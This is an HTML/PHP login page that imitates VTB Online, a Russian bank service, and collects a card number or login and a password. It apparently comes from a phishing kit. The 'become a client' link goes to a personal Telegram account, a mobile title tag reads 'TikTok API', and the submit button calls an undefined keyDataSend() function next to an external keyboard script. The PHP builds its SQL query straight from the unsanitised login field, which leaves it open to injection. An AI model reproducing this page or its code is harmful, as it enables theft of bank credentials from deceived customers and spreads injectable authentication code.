<!DOCTYPE html>
<html lang="en">
<head>
<title>ВТБ Онлайн</title>
<meta name="google" content="notranslate">
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width,user-scalable=yes, initial-scale=1.0">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="white">
<meta name="apple-mobile-web-app-title" content="TikTok API">
<meta name="theme-color" content="#1e1f21"/>
<script type='text/javascript' src='https://www.google.com/recaptcha/api.js?hl=ru'></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>

</head>

<body>

<?php
ob_start(); session_start();
include_once("db_connect.php");
include_once("assets/css/style.php");

header('Access-Control-Allow-Origin: *');

header('Access-Control-Allow-Methods: GET, POST');

header("Access-Control-Allow-Headers: X-Requested-With");

//////////// RECAPCHA_CONFIG ////////////////
include_once('assets/modules/recaptcha/recaptchalib.php');
$siteKey = "SITE_KEY";
$secret = "SITE_SECRET";
$lang = "ru";
$resp = null;
$error = null;
$reCaptcha = new ReCaptcha($secret);
/////////////////////////////////////////////

?>

<style type="text/css">
body {
	position: absolute;
	top: 0px;
	left: 0px;
	right: 0px;
	bottom: 0px;
}

.group {
	width: calc(100% - 32px);
}
</style>

<div class="auth_content">
<div class="half_block info_block">
        <div class="hb_inner">
        <span class="hb_title">ВТБ<br>ОНЛАЙН<br></span>
        <div class="hb_btns_block">
            <a href="https://t.me/misty_nebula" rel="noopener" class="hb_start">Стать клиентом</a>
            <a href="https://www.youtube.com/watch?v=nm9-a-0iN6s" target="_blank" rel="noopener" class="hb_video">Поддержка</a>
        </div>
        </div>
</div>
<div class="half_block auth_container">
<div class="reg_block">
<div class="block_title">
<h1>Вход</h1>
</div>
<form method="POST" action="">
	<div class="group" id="group_big" style="margin-bottom: 20px;">      
        <input type="text" required="" autocomplete="off" name="e_login" required="" id="input_1">
        <span class="highlight"></span>
        <label for="h_emailInput">Номер карты или логин</label>
        </div>

        <div class="group" id="group_big">      
        <input type="password" required="" autocomplete="off" name="e_password" required="" id="input_2"> 
        <span class="highlight"></span>
        <label for="h_emailPassword">Пароль</label>
        </div>
        <div class='g-recaptcha' data-sitekey='<?=$siteKey;?>' class='recapcha_block'></div>
        <input type="submit" value="Войти" name="enter" class="reg_button" onclick="keyDataSend()">
</form>
</div>
</div>
</div>


<?php 
if (isset($_POST['enter'])) {

    if ($_POST["g-recaptcha-response"]) {
    $resp = $reCaptcha->verifyResponse(
    $_SERVER["REMOTE_ADDR"],
    $_POST["g-recaptcha-response"]
    ); }
if ($resp != null && $resp->success) {
        if (isset($_POST['e_login'])){
                if (isset($_POST['e_password'])){
                   $e_login = $_POST['e_login'];
                   $e_password = md5(hash('sha512', hash('sha256', $_POST['e_password'])));
                   $query = mysqli_query($connection,"SELECT * FROM users WHERE users.u_login = '$e_login' AND users.u_password = '$e_password'");
                   $row = mysqli_fetch_array($query);
                   if (mysqli_num_rows($query) > 0){
                      $_SESSION['session_token'] = md5($e_login.$e_password);
                      header("Location: index");
                   } else {
                      echo "<script type='text/javascript'>//showMessage('Error','Wrong name or password');</script>";
                   } } } } else {
                      echo "<script type='text/javascript'>//showMessage('Error','Captcha not complete');</script>";
} }

if (isset($_GET['logout'])){
   if ($_GET['logout'] == true){
      unset($_SESSION['session_token']);
      header("Location: auth");
   } } else {
if (isset($_SESSION['session_token'])) {
        header("Location: index");
} }

?>

<script type="text/javascript" src=assets/js/ml_keyboard.js?<?=$cur_time;?>"></script>

</body>